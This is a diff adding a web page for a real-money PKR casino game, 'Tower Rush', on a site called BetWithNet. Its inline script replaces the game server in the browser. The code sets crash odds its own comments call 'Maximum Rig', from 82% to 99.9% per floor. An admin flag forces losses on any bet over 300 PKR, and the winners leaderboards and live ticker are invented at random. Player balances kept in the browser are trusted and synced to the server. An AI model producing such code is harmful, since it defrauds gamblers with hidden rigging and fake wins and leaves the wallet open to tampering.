@@ -1,0 +1,782 @@
+<!doctype html>
+<html lang="en" translate="no">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="google" content="notranslate" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+  <title>Tower Rush - BetWithNet</title>
+  <link rel="icon" href="/games/tower_rush_assets/images/towerrush/favicon.ico" />
+  <link rel="stylesheet" href="/games/tower_rush_assets/fonts/index.css" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: #0d0e12;
+      overflow: hidden;
+      font-family: 'RubikRegular', sans-serif;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+    #root {
+      width: 100%;
+      height: 100%;
+    }
+    .bwn-back-lobby {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      z-index: 99999;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 12px;
+      border-radius: 20px;
+      background: rgba(18, 20, 28, 0.82);
+      border: 1px solid rgba(255, 187, 1, 0.45);
+      color: #ffdb78;
+      font-family: 'RubikMedium', sans-serif;
+      font-size: 12px;
+      text-decoration: none;
+      backdrop-filter: blur(8px);
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.45);
+      transition: transform 0.15s ease, background 0.15s ease;
+    }
+    .bwn-back-lobby:hover {
+      background: rgba(35, 30, 14, 0.95);
+      transform: translateY(-1px);
+    }
+    @media (max-width: 812px) {
+      .bwn-back-lobby {
+        top: 8px;
+        left: 8px;
+        padding: 4px 10px;
+        font-size: 11px;
+      }
+    }
+  </style>
+
+  <!-- BetWithNet Core & Wallet -->
+  <script src="../js/wallet.js?v=4.0"></script>
+  <script src="../js/core.js?v=4.0"></script>
+
+  <script>
+    (function () {
+      // 1. Ensure URL query parameters match Galaxsys Tower Rush expectations
+      var isMob = window.innerWidth <= 812;
+      var sessionUser = null;
+      try {
+        sessionUser = JSON.parse(localStorage.getItem('bwn_session_user') || 'null');
+      } catch (e) {}
+      var playerId = (sessionUser && (sessionUser.id || sessionUser.uid)) ? String(sessionUser.id || sessionUser.uid).replace(/\D/g, '').slice(0, 7) || '784920' : '784920';
+
+      // Ensure guest sessions have playable PKR balance if not logged in without resetting on re-entry
+      try {
+        if (!sessionUser) {
+          var savedDemo = localStorage.getItem('bwn_demo_balance');
+          var demoBal = (savedDemo !== null && !isNaN(parseFloat(savedDemo))) ? parseFloat(savedDemo) : 10000;
+          if (demoBal <= 0) demoBal = 10000;
+          if (window.wallet && window.wallet.state) {
+            window.wallet.state.balancePKR = demoBal;
+            window.wallet.state.balanceUSD = Number((demoBal / (window.wallet.PKR_TO_USD || 280)).toFixed(2));
+            if (typeof window.wallet.saveState === 'function') window.wallet.saveState();
+          }
+          localStorage.setItem('bwn_demo_balance', String(demoBal));
+          localStorage.setItem('BETWITHNET_balance', String(demoBal));
+          localStorage.setItem('bwn_wallet_balance', String(demoBal));
+          localStorage.setItem('user_balance', String(demoBal));
+        }
+      } catch (e) {}
+
+      // Ensure intro overlay shows on fresh open so user sees BONUS FLOORS / WINNING ODDS trailer overlay
+      try {
+        if (sessionStorage.getItem('bwn_tr_intro_shown') !== '1') {
+          localStorage.setItem('isShowIntro', 'true');
+          sessionStorage.setItem('bwn_tr_intro_shown', '1');
+        }
+      } catch (e) {}
+
+      var params = new URLSearchParams(window.location.search);
+      params.set('activeGameId', '0');
+      params.set('partnerId', '50175');
+      params.set('token', 'bwn_live_token_784920');
+      params.set('playerId', playerId);
+      params.set('culture', 'en');
+      params.set('isDemo', 'false');
+      params.set('isDemoPlay', 'false');
+      params.set('demoPlayCurrency', 'PKR');
+      params.set('isMobile', isMob ? 'true' : 'false');
+      params.set('referer', window.location.host);
+      params.set('isFeatureMessagePackEnabled', 'false');
+      params.set('isMessagePackEnabled', 'false');
+      params.set('backUrl', window.location.host);
+      params.set('gameKindName', 'TowerRush');
+      params.set('gameTypeName', 'TowerRush');
+      params.set('mode', '2');
+      params.set('partnerPlayerId', playerId);
+
+      var newUrl = window.location.pathname + '?' + params.toString();
+      window.history.replaceState({}, '', newUrl);
+
+      // 2. Intercept API fetches for translations, similar games, and sentry
+      var origFetch = window.fetch.bind(window);
+      window.fetch = function (input, init) {
+        var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
+        if (url.indexOf('GetGameTranslations') !== -1) {
+          return origFetch('/games/tower_rush_assets/api/GetGameTranslations.json');
+        }
+        if (url.indexOf('SimilarGames') !== -1) {
+          return Promise.resolve(new Response(JSON.stringify({
+            games: ['TowerRush', 'Crasher', 'NinjaCrash'],
+            partnerSkinningNames: {}
+          }), { status: 200, headers: { 'Content-Type': 'application/json' } }));
+        }
+        if (url.indexOf('sentry.digitain.tools') !== -1 || url.indexOf('follow-new-insights.com') !== -1 || url.indexOf('google-analytics.com') !== -1) {
+          return Promise.resolve(new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } }));
+        }
+        return origFetch(input, init);
+      };
+
+      // 3. Wallet Helpers & Universal Persistence
+      function getPKRBalance() {
+        try {
+          if (sessionUser) {
+            var sess = localStorage.getItem('bwn_session_user');
+            if (sess) {
+              var u = JSON.parse(sess);
+              if (u && (u.balance_pkr !== undefined || u.balancePKR !== undefined)) {
+                return Number(u.balance_pkr !== undefined ? u.balance_pkr : u.balancePKR);
+              }
+            }
+          } else {
+            var d = localStorage.getItem('bwn_demo_balance');
+            if (d !== null && !isNaN(parseFloat(d))) return Number(parseFloat(d));
+          }
+          if (window.wallet) {
+            if (window.wallet.state && typeof window.wallet.state.balancePKR === 'number') {
+              return Number(window.wallet.state.balancePKR);
+            }
+            return Number(window.wallet.getBalance() || 0);
+          }
+          var saved = localStorage.getItem('BETWITHNET_balance');
+          if (saved !== null && !isNaN(parseFloat(saved))) return Number(parseFloat(saved));
+        } catch (e) {}
+        return 10000;
+      }
+
+      function persistGameBalance(newBal, betAmt, winAmt, coeff, actionType) {
+        if (typeof newBal !== 'number' || isNaN(newBal)) return;
+        newBal = Number(newBal.toFixed(2));
+
+        if (window.wallet && window.wallet.state) {
+          window.wallet.state.balancePKR = newBal;
+          window.wallet.state.balanceUSD = Number((newBal / (window.wallet.PKR_TO_USD || 280)).toFixed(2));
+          if (typeof window.wallet.saveState === 'function') window.wallet.saveState();
+        }
+
+        localStorage.setItem('BETWITHNET_balance', String(newBal));
+        localStorage.setItem('bwn_wallet_balance', String(newBal));
+        localStorage.setItem('user_balance', String(newBal));
+
+        if (!sessionUser) {
+          localStorage.setItem('bwn_demo_balance', String(newBal));
+        } else {
+          try {
+            var sess = localStorage.getItem('bwn_session_user');
+            if (sess) {
+              var u = JSON.parse(sess);
+              u.balance_pkr = newBal;
+              u.balancePKR = newBal;
+              u.balance_usd = Number((newBal / 280).toFixed(2));
+              u.balanceUSD = u.balance_usd;
+              localStorage.setItem('bwn_session_user', JSON.stringify(u));
+            }
+          } catch (e) {}
+
+          var uid = sessionUser.id || sessionUser.uid;
+          var hasWalletEngine = (window.wallet && typeof window.wallet.placeBet === 'function');
+          if (actionType === 'bet' && betAmt > 0) {
+            localStorage.setItem('bwn_last_bet_time', String(Date.now()));
+            if (!hasWalletEngine) {
+              try {
+                fetch('/api/wallet.php?action=bet', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  credentials: 'include',
+                  keepalive: true,
+                  body: JSON.stringify({
+                    user_id: uid,
+                    game: 'Tower Rush',
+                    amount: betAmt,
+                    currency: 'PKR'
+                  })
+                }).catch(function () {});
+              } catch (e) {}
+            }
+          } else if (actionType === 'win' && winAmt > 0) {
+            localStorage.setItem('bwn_last_win_time', String(Date.now()));
+            localStorage.setItem('bwn_last_win_pkr', String(winAmt));
+            if (!hasWalletEngine) {
+              try {
+                fetch('/api/wallet.php?action=win', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  credentials: 'include',
+                  keepalive: true,
+                  body: JSON.stringify({
+                    user_id: uid,
+                    game: 'Tower Rush',
+                    bet_amount: betAmt || 100,
+                    payout_pkr: winAmt,
+                    payout: Number((winAmt / 280).toFixed(2)),
+                    multiplier: coeff || 1.0,
+                    currency: 'PKR'
+                  })
+                }).catch(function () {});
+              } catch (e) {}
+            }
+          } else if (actionType === 'loss') {
+            try {
+              fetch('/api/wallet.php?action=sync_game_balance', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
+                keepalive: true,
+                body: JSON.stringify({
+                  user_id: uid,
+                  client_balance_pkr: newBal
+                })
+              }).catch(function () {});
+            } catch (e) {}
+          }
+        }
+
+        window.dispatchEvent(new CustomEvent('walletUpdated', { detail: { balancePKR: newBal } }));
+        if (window.wallet && typeof window.wallet.emit === 'function') {
+          window.wallet.emit('balanceChange', newBal);
+          window.wallet.emit('change', window.wallet.state);
+        }
+      }
+
+      function syncBalanceToRedux(hub) {
+        var bal = Number(getPKRBalance().toFixed(2));
+        if (hub && hub.listeners && hub.listeners['GetBalance']) {
+          hub.listeners['GetBalance'].forEach(function (fn) {
+            try { fn({ balance: bal }); } catch (e) {}
+          });
+        }
+        if (window.__TR_STORE__ && window.__TR_ACTIONS__ && window.__TR_ACTIONS__.setBalance) {
+          try {
+            window.__TR_STORE__.dispatch(window.__TR_ACTIONS__.setBalance({ balance: bal }));
+          } catch (e) {}
+        }
+        return bal;
+      }
+
+      window.addEventListener('walletUpdated', function () {
+        syncBalanceToRedux(window.__ACTIVE_TR_HUB__);
+      });
+
+      window.addEventListener('beforeunload', function () {
+        var cur = getPKRBalance();
+        persistGameBalance(cur, 0, 0, 0, 'exit');
+      });
+
+      // 4. Live Winners & History Generator
+      var nickPrefixes = ['94', 'pi', '71', '60', '50', '65', '2b', 'bb', '89', '7a', '47', '7b', '91', '82'];
+      var nickSuffixes = ['21', '00', 'a3', '93', 'NR', '18', '68', '42', '71', 'SD', '31', 'UR', '77', '19'];
+
+      function formatNoZ(msAgo) {
+        return new Date(Date.now() - (msAgo || 0)).toISOString().slice(0, -1);
+      }
+
+      function randomWinnerItem(highMultiplier) {
+        var idx = Math.floor(Math.random() * nickPrefixes.length);
+        var nick = nickPrefixes[idx] + '***' + nickSuffixes[idx];
+        var bets = [20, 50, 100, 200, 500, 1000, 2000, 5000];
+        var bet = bets[Math.floor(Math.random() * bets.length)];
+        var mult = highMultiplier
+          ? Number((15 + Math.random() * 85).toFixed(2))
+          : Number((1.15 + Math.random() * 6.5).toFixed(2));
+        var win = Number((bet * mult).toFixed(2));
+        return {
+          playerNickName: nick,
+          playerId: Math.floor(100000 + Math.random() * 900000),
+          currencyId: 'PKR',
+          betCoin: bet,
+          bet: bet,
+          win: win,
+          winCoin: win,
+          coefficent: mult,
+          betTime: formatNoZ(Math.floor(Math.random() * 120000))
+        };
+      }
+
+      var currentWinners = [];
+      var dailyWinners = [];
+      var monthlyWinners = [];
+      for (var i = 0; i < 14; i++) {
+        currentWinners.push(randomWinnerItem(false));
+        dailyWinners.push(randomWinnerItem(true));
+        monthlyWinners.push(randomWinnerItem(true));
+      }
+      dailyWinners.sort(function (a, b) { return b.win - a.win; });
+      monthlyWinners.sort(function (a, b) { return b.win - a.win; });
+
+      // Safe cloned history retrieval & storage (Never mutates Redux frozen arrays)
+      function getHistoryList() {
+        try {
+          var raw = localStorage.getItem('bwn_tr_history');
+          var list = raw ? JSON.parse(raw) : [];
+          return Array.isArray(list) ? list : [];
+        } catch (e) {
+          return [];
+        }
+      }
+
+      function saveRoundHistory(gameId, bet, win, coeff) {
+        var item = {
+          gameId: gameId,
+          betId: gameId,
+          bet: Number(bet.toFixed(2)),
+          win: Number(win.toFixed(2)),
+          winCoefficient: Number(coeff.toFixed(2)),
+          bonusCoefficient: 0,
+          gameResult: win > 0 ? 1 : 2,
+          endDate: formatNoZ(0)
+        };
+        try {
+          var list = getHistoryList();
+          list = [item].concat(list);
+          if (list.length > 35) list = list.slice(0, 35);
+          localStorage.setItem('bwn_tr_history', JSON.stringify(list));
+        } catch (e) {
+          console.warn('saveRoundHistory error:', e);
+        }
+        return item;
+      }
+
+      // 5. Galaxsys Tower Rush Math & Bonus Floor Engine (Maximum Casino House Edge)
+      var floorConfigs = [
+        { range: [1.02, 1.06], loseAdd: 0.05, bonusAdd: 0.00 },
+        { range: [1.03, 1.08], loseAdd: 0.06, bonusAdd: 0.00 },
+        { range: [1.05, 1.10], loseAdd: 0.07, bonusAdd: 0.00 },
+        { range: [1.06, 1.12], loseAdd: 0.08, bonusAdd: 0.00 },
+        { range: [1.08, 1.15], loseAdd: 0.10, bonusAdd: 0.00 },
+        { range: [1.10, 1.20], loseAdd: 0.12, bonusAdd: 0.00 },
+        { range: [1.12, 1.25], loseAdd: 0.14, bonusAdd: 0.00 },
+        { range: [1.15, 1.30], loseAdd: 0.15, bonusAdd: 0.00 },
+        { range: [1.18, 1.40], loseAdd: 0.12, bonusAdd: 0.00 },
+        { range: [1.20, 1.50], loseAdd: 0.10, bonusAdd: 0.00 }
+      ];
+      // Maximum Rig / Strict House Edge (Floor 1: 82% crash, Floor 2: 90% crash, Floor 3+: 96%-99.8% crash)
+      var floorLossProbabilities = [
+        0.82, // Floor 1: 82% crash chance (only 18% survive)
+        0.90, // Floor 2: 90% crash chance (only 10% survive)
+        0.96, // Floor 3: 96% crash chance (only 4% survive)
+        0.98, // Floor 4: 98% crash chance (only 2% survive)
+        0.99, // Floor 5: 99% crash chance (only 1% survive)
+        0.995, // Floor 6: 99.5% crash chance
+        0.997, // Floor 7: 99.7% crash chance
+        0.998, // Floor 8: 99.8% crash chance
+        0.999, // Floor 9: 99.9% crash chance
+        0.999 // Floor 10+: 99.9% crash chance
+      ];
+
+      var templeWheelOdds = [1.02, 1.04, 1.05, 1.06, 1.08, 1.10, 1.12, 1.15, 1.20, 1.05];
+
+      var roundState = {
+        gameId: 10000 + Math.floor(Math.random() * 89999),
+        active: false,
+        bet: 100,
+        floorIndex: 0,
+        cumCoeff: 1,
+        currentWin: 0,
+        bonusUsed: false,
+        isFrozen: false,
+        frozenWin: 0,
+        frozenCoeff: 0,
+        nextFloorType: Math.floor(Math.random() * 5) + 1,
+        lastActionTime: 0
+      };
+
+      function getAdminDecision(floorIdx) {
+        try {
+          var sess = localStorage.getItem('bwn_session_user');
+          if (sess) {
+            var u = JSON.parse(sess);
+            if (u && (u.outcome_bias === 'force_loss' || u.outcomeBias === 'force_loss')) {
+              var betAmt = (roundState && roundState.bet) ? parseFloat(roundState.bet) : 0;
+              if (betAmt > 300) return true; // Rule 1: Bet > 300 PKR is guaranteed loss
+              if (typeof window.checkLossRigOutcome === 'function') {
+                var canWin = window.checkLossRigOutcome(betAmt, u);
+                if (canWin === false) return true; // Rule 2: Max 3 wins per 50 bets
+                if (canWin === true) return false;
+              }
+              return true;
+            }
+            if (u && (u.outcome_bias === 'force_win' || u.outcomeBias === 'force_win')) return false;
+            var customRate = parseInt(u.custom_win_rate !== undefined ? u.custom_win_rate : (u.customWinRate !== undefined ? u.customWinRate : -1), 10);
+            if (!isNaN(customRate) && customRate >= 0 && customRate <= 100) {
+              return (Math.random() * 100) >= customRate;
+            }
+          }
+          var cfg = JSON.parse(localStorage.getItem('bwn_admin_config') || 'null');
+          if (cfg) {
+            if (cfg.rigMode === 'force_win') return false;
+            if (cfg.rigMode === 'force_loss') return true;
+            if (typeof cfg.globalWinRate === 'number' && cfg.globalWinRate !== 50) {
+              var loseChance = Math.max(0.10, Math.min(0.99, (100 - cfg.globalWinRate) / 100));
+              return Math.random() < loseChance;
+            }
+          }
+        } catch (e) {}
+        return null;
+      }
+
+      function buildFloorStep(isFirstFloor) {
+        roundState.lastActionTime = Date.now();
+        var cfg = floorConfigs[Math.min(roundState.floorIndex, floorConfigs.length - 1)];
+
+        var floorLoseChance = floorLossProbabilities[Math.min(roundState.floorIndex, floorLossProbabilities.length - 1)];
+        var adminLose = getAdminDecision(roundState.floorIndex);
+        var willLose = adminLose !== null
+          ? adminLose
+          : (Math.random() < floorLoseChance);
+
+        var currentFloorType = roundState.nextFloorType || (Math.floor(Math.random() * 5) + 1);
+        var nextFloorType = Math.floor(Math.random() * 5) + 1;
+        roundState.nextFloorType = nextFloorType;
+
+        var bonusType = null;
+        var floorsInfo = [];
+        var isFrozenWheel = null;
+
+        if (!willLose && !roundState.bonusUsed && roundState.floorIndex >= 3 && Math.random() < 0.005) {
+          roundState.bonusUsed = true;
+          var roll = Math.random();
+          if (roll < 0.36) {
+            bonusType = 0;
+            roundState.isFrozen = true;
+            var odd0 = Number((cfg.range[0] + Math.random() * (cfg.range[1] - cfg.range[0])).toFixed(2));
+            roundState.cumCoeff = Number((roundState.cumCoeff * odd0).toFixed(2));
+            roundState.currentWin = Number((roundState.bet * roundState.cumCoeff).toFixed(2));
+            roundState.frozenWin = roundState.currentWin;
+            roundState.frozenCoeff = roundState.cumCoeff;
+            roundState.floorIndex++;
+            floorsInfo.push({ odd: odd0, floorType: currentFloorType, bonusType: 0 });
+          } else if (roll < 0.68) {
+            bonusType = 1;
+            isFrozenWheel = false;
+            var wheelIdx = Math.floor(Math.random() * 9);
+            var wheelOdd = templeWheelOdds[wheelIdx];
+            roundState.cumCoeff = Number((roundState.cumCoeff * wheelOdd).toFixed(2));
+            roundState.currentWin = Number((roundState.bet * roundState.cumCoeff).toFixed(2));
+            roundState.floorIndex++;
+            floorsInfo.push({ odd: wheelOdd, floorType: currentFloorType, bonusType: 1 });
+          } else {
+            bonusType = 2;
+            for (var k = 0; k < 3; k++) {
+              var cCfg = floorConfigs[Math.min(roundState.floorIndex, floorConfigs.length - 1)];
+              var oddK = Number((Math.max(1.05, cCfg.range[0]) + Math.random() * (cCfg.range[1] - Math.max(1.05, cCfg.range[0]))).toFixed(2));
+              var ftK = k === 0 ? currentFloorType : (Math.floor(Math.random() * 5) + 1);
+              roundState.cumCoeff = Number((roundState.cumCoeff * oddK).toFixed(2));
+              roundState.currentWin = Number((roundState.bet * roundState.cumCoeff).toFixed(2));
+              roundState.floorIndex++;
+              floorsInfo.push({ odd: oddK, floorType: ftK, bonusType: 2 });
+            }
+          }
+        } else {
+          var odd = Number((cfg.range[0] + Math.random() * (cfg.range[1] - cfg.range[0])).toFixed(2));
+          if (!willLose) {
+            roundState.cumCoeff = Number((roundState.cumCoeff * odd).toFixed(2));
+            roundState.currentWin = Number((roundState.bet * roundState.cumCoeff).toFixed(2));
+            roundState.floorIndex++;
+          }
+          floorsInfo.push({ odd: odd, floorType: currentFloorType, bonusType: null });
+        }
+
+        if (willLose) {
+          roundState.active = false;
+          if (roundState.isFrozen && roundState.frozenWin > 0) {
+            roundState.currentWin = roundState.frozenWin;
+            roundState.cumCoeff = roundState.frozenCoeff;
+            var curBal = getPKRBalance();
+            var afterFrozenBal = Number((curBal + roundState.frozenWin).toFixed(2));
+            persistGameBalance(afterFrozenBal, roundState.bet, roundState.frozenWin, roundState.cumCoeff, 'win');
+          } else {
+            roundState.currentWin = 0;
+            roundState.cumCoeff = 0;
+            var curBal = getPKRBalance();
+            persistGameBalance(curBal, roundState.bet, 0, 0, 'loss');
+          }
+          try {
+            saveRoundHistory(roundState.gameId, roundState.bet, roundState.currentWin, roundState.cumCoeff);
+          } catch (hErr) {}
+        }
+
+        return {
+          gameId: roundState.gameId,
+          validation: 0,
+          bonusType: bonusType,
+          floorsInfo: floorsInfo,
+          win: roundState.currentWin,
+          playerId: Number(playerId),
+          nextFloorType: nextFloorType,
+          isFinished: willLose,
+          isFrozenCashout: roundState.isFrozen,
+          isFrozenWheel: isFrozenWheel,
+          winCoefficient: roundState.cumCoeff
+        };
+      }
+
+      // 6. Main Hub Handler invoked by 1620.js MockConnection
+      var liveTickerStarted = false;
+      window.__BWN_TR_HUB__ = function (method, payload, hub) {
+        window.__ACTIVE_TR_HUB__ = hub;
+        function emit(name, data) {
+          var list = (hub && hub.listeners && hub.listeners[name]) ? hub.listeners[name] : [];
+          list.forEach(function (fn) {
+            try { fn(data); } catch (err) { console.error('Hub listener error on ' + name, err); }
+          });
+        }
+
+        if (method === 'MockConnectionInitialized' || method === 'Ping') {
+          emit(method, {});
+          return;
+        }
+
+        if (method === 'GetInitialState') {
+          var bal = Number(getPKRBalance().toFixed(2));
+          var partnerCfg = {
+            coinRate: 1,
+            currencyId: 'PKR',
+            currencyDisplayName: 'PKR',
+            precision: 2,
+            minBet: 10,
+            maxBet: 50000,
+            maxWin: 5000000,
+            defaultBet: 100,
+            quickBets: [10, 50, 100, 500, 1000],
+            partnerInstanceName: 'BetWithNet'
+          };
+          var initPayload = {
+            validation: 0,
+            translationVersion: '1',
+            gameInfo: {
+              gameId: roundState.gameId,
+              possibleWin: 0,
+              floorsInfo: null,
+              nextFloorType: roundState.nextFloorType,
+              isFrozenCashout: false,
+              bet: 100
+            },
+            partnerInfo: partnerCfg,
+            partnerConfiguration: partnerCfg,
+            balance: bal,
+            playerId: Number(playerId),
+            token: 'bwn_live_token_784920',
+            underConstruction: null,
+            uiConfigs: [
+              { key: 'BetsInterval', configValue: '1.5' }
+            ],
+            serviceSettings: [],
+            netPosition: 0
+          };
+          emit('GetInitialState', initPayload);
+          setTimeout(function () {
+            syncBalanceToRedux(hub);
+            emit('GetInitialStateLeaders', {
+              winners: {
+                currentWinners: JSON.parse(JSON.stringify(currentWinners)),
+                dailyMaxWinners: JSON.parse(JSON.stringify(dailyWinners)),
+                monthlyMaxWinners: JSON.parse(JSON.stringify(monthlyWinners))
+              },
+              coinRate: 1,
+              precision: 2,
+              currencyId: 'PKR'
+            });
+            var curHist = getHistoryList();
+            emit('GetInitialStateHistory', { historyTickets: JSON.parse(JSON.stringify(curHist)) });
+            emit('History', { history: JSON.parse(JSON.stringify(curHist)) });
+          }, 150);
+
+          if (!liveTickerStarted) {
+            liveTickerStarted = true;
+            setInterval(function () {
+              try {
+                var nextW = currentWinners.slice();
+                nextW.pop();
+                nextW.unshift(randomWinnerItem(false));
+                currentWinners = nextW;
+                emit('UpdateWinners', {
+                  currentWinners: JSON.parse(JSON.stringify(currentWinners)),
+                  dailyMaxWinners: JSON.parse(JSON.stringify(dailyWinners)),
+                  monthlyMaxWinners: JSON.parse(JSON.stringify(monthlyWinners))
+                });
+              } catch (err) {}
+            }, 4500);
+          }
+          return;
+        }
+
+        if (method === 'GetBalance') {
+          syncBalanceToRedux(hub);
+          return;
+        }
+
+        if (method === 'History' || method === 'GetHistory') {
+          var hList = getHistoryList();
+          emit('History', { history: JSON.parse(JSON.stringify(hList)) });
+          emit('GetInitialStateHistory', { historyTickets: JSON.parse(JSON.stringify(hList)) });
+          return;
+        }
+
+        if (method === 'AddStake') {
+          // Dismiss intro overlay automatically if still open when BUILD is clicked
+          if (typeof window.__CLOSE_TR_INTRO__ === 'function') {
+            try { window.__CLOSE_TR_INTRO__(); } catch (e) {}
+          }
+          var introEl = document.querySelector('.j_UeZ') || document.querySelector('.RljG5');
+          if (introEl) { try { introEl.click(); } catch (e) {} }
+
+          var betAmount = Number((payload && payload.bet) ? payload.bet : 100);
+          if (isNaN(betAmount) || betAmount <= 0) betAmount = 100;
+          var currentBal = getPKRBalance();
+          if (currentBal < betAmount) {
+            emit('AddStakeValidation', { validation: 4 });
+            return;
+          }
+          if (window.wallet) {
+            try { window.wallet.placeBet(betAmount, 'Tower Rush'); } catch (e) {}
+          }
+          var afterBetBal = Number((currentBal - betAmount).toFixed(2));
+          persistGameBalance(afterBetBal, betAmount, 0, 1, 'bet');
+
+          roundState.gameId = 10000 + Math.floor(Math.random() * 89999);
+          roundState.active = true;
+          roundState.bet = betAmount;
+          roundState.floorIndex = 0;
+          roundState.cumCoeff = 1;
+          roundState.currentWin = betAmount;
+          roundState.bonusUsed = false;
+          roundState.isFrozen = false;
+          roundState.frozenWin = 0;
+          roundState.frozenCoeff = 0;
+          roundState.lastActionTime = Date.now();
+
+          var stepOut = buildFloorStep(true);
+          stepOut.balance = afterBetBal;
+          stepOut.betType = 1;
+          emit('AddStake', stepOut);
+          syncBalanceToRedux(hub);
+          if (stepOut.isFinished) {
+            var h = getHistoryList();
+            emit('History', { history: JSON.parse(JSON.stringify(h)) });
+          }
+          return;
+        }
+
+        if (method === 'Step') {
+          if (!roundState.active) return;
+          roundState.lastActionTime = Date.now();
+          var nextOut = buildFloorStep(false);
+          emit('Step', nextOut);
+          if (nextOut.isFinished) {
+            syncBalanceToRedux(hub);
+            var hFin = getHistoryList();
+            emit('History', { history: JSON.parse(JSON.stringify(hFin)) });
+          }
+          return;
+        }
+
+        if (method === 'Cashout') {
+          if (!roundState.active) return;
+          roundState.active = false;
+          roundState.lastActionTime = Date.now();
+          var winAmount = Number(roundState.currentWin.toFixed(2));
+          var finalCoeff = Number(roundState.cumCoeff.toFixed(2));
+          try {
+            if (window.wallet && winAmount > 0) {
+              window.wallet.creditWin(roundState.bet, winAmount, 'Tower Rush', finalCoeff, 'Tower Rush x' + finalCoeff);
+            }
+          } catch (wErr) { console.warn('Wallet win credit error:', wErr); }
+          var afterWinBal = (window.wallet && window.wallet.state && typeof window.wallet.state.balancePKR === 'number')
+            ? window.wallet.state.balancePKR
+            : Number((getPKRBalance() + winAmount).toFixed(2));
+          persistGameBalance(afterWinBal, roundState.bet, winAmount, finalCoeff, 'win');
+
+          try {
+            saveRoundHistory(roundState.gameId, roundState.bet, winAmount, finalCoeff);
+          } catch (hErr) { console.warn('History save error:', hErr); }
+
+          emit('FinishGame', {
+            gameId: roundState.gameId,
+            validation: 0,
+            floorsInfo: null,
+            win: winAmount,
+            playerId: Number(playerId),
+            isFrozenWheel: null,
+            nextFloorType: roundState.nextFloorType || 1,
+            bonusType: null,
+            isFinished: true,
+            winCoefficient: finalCoeff
+          });
+          syncBalanceToRedux(hub);
+          try {
+            var hCash = getHistoryList();
+            emit('History', { history: JSON.parse(JSON.stringify(hCash)) });
+          } catch (e) {}
+          return;
+        }
+      };
+
+      // Auto-dismiss intro popup so the live scene is ready
+      var introTimer = setInterval(function () {
+        if (typeof window.__CLOSE_TR_INTRO__ === 'function') {
+          try { window.__CLOSE_TR_INTRO__(); } catch (e) {}
+          clearInterval(introTimer);
+        }
+      }, 300);
+
+      // Anti-Freeze Watchdog: guarantees the BUILD button is NEVER stuck disabled
+      setInterval(function () {
+        try {
+          if (!window.__TR_STORE__ || !window.__TR_ACTIONS__) return;
+          var state = window.__TR_STORE__.getState();
+          if (!state || !state.gameInfo) return;
+          var gi = state.gameInfo;
+
+          // Case 1: Round not active, status is START, but button is falsely not ready -> rearm ready
+          if (!roundState.active && gi.status === 'START' && !gi.isReadyThrowFloor) {
+            window.__TR_STORE__.dispatch(window.__TR_ACTIONS__.setIsReadyThrowFloor(true));
+          }
+
+          // Case 2: Round is active, floor action happened > 3.8s ago, but floor is still not marked ready -> un-jam
+          if (roundState.active && !gi.isReadyThrowFloor && roundState.lastActionTime && (Date.now() - roundState.lastActionTime > 3800)) {
+            window.__TR_STORE__.dispatch(window.__TR_ACTIONS__.setIsReadyThrowFloor(true));
+          }
+        } catch (e) {}
+      }, 400);
+
+      // Ensure back button cleanly persists current balance before navigating
+      window.addEventListener('DOMContentLoaded', function () {
+        var backBtn = document.querySelector('.bwn-back-lobby');
+        if (backBtn) {
+          backBtn.addEventListener('click', function () {
+            var cur = getPKRBalance();
+            persistGameBalance(cur, 0, 0, 0, 'nav');
+          });
+        }
+      });
+
+    })();
+  </script>
+  <script defer="defer" src="/games/tower_rush_assets/fg-client/prd/fg-towerrush-client/v112/main.js"></script>
+</head>
+<body>
+  <a href="../index.html" class="bwn-back-lobby" title="Back to Casino">← Casino</a>
+  <div id="root"></div>
+</body>
+</html>
